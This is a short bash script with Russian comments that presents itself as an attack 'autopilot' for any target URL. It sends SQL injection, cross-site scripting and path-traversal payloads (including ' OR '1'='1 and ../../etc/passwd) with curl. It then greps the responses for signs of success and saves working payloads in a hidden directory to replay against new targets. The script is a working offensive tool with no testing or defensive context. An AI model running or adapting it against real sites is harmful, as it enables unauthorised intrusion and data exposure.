#!/bin/bash
# Авто-пилот — запоминает успешные атаки и применяет на новых целях
BRAIN="$HOME/.shadow_brain"
mkdir -p "$BRAIN"

TARGET=$1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')

echo "[AUTOPILOT] Анализирую прошлый опыт..."

# Загружаем успешные паттерны
if [ -f "$BRAIN/successful_attacks.txt" ]; then
    echo "[AUTOPILOT] Найдено успешных атак: $(wc -l < "$BRAIN/successful_attacks.txt")"
    
    # Применяем каждый паттерн к новой цели
    while read attack; do
        type=$(echo "$attack" | cut -d'|' -f1)
        payload=$(echo "$attack" | cut -d'|' -f2)
        
        echo "[AUTOPILOT] Пробую $type: $payload"
        case "$type" in
            SQLi) curl -sk --max-time 5 "$TARGET?id=$payload" -o /tmp/autopilot_test.html 2>/dev/null
                  grep -qi "sql\|error\|syntax" /tmp/autopilot_test.html && echo "  ✅ SQLi сработал!" && echo "$type|$payload|$TARGET" >> "$BRAIN/successful_attacks.txt"
                  ;;
            XSS)  curl -sk --max-time 5 "$TARGET?q=$payload" -o /tmp/autopilot_test.html 2>/dev/null
                  grep -q "$payload" /tmp/autopilot_test.html && echo "  ✅ XSS сработал!"
                  ;;
            LFI)  curl -sk --max-time 5 "$TARGET?file=$payload" -o /tmp/autopilot_test.html 2>/dev/null
                  grep -q "root:" /tmp/autopilot_test.html && echo "  ✅ LFI сработал!"
                  ;;
        esac
    done < "$BRAIN/successful_attacks.txt"
else
    echo "[AUTOPILOT] Нет опыта — обучаюсь..."
    # Первый запуск — пробуем базовые атаки и запоминаем что сработало
    for p in "' OR '1'='1" "<script>alert(1)</script>" "../../etc/passwd"; do
        curl -sk --max-time 5 "$TARGET?q=$p" -o /tmp/autopilot_test.html 2>/dev/null
        if grep -qi "sql\|error" /tmp/autopilot_test.html; then
            echo "SQLi|$p" >> "$BRAIN/successful_attacks.txt"
        fi
    done
    echo "[AUTOPILOT] Обучение завершено"
fi
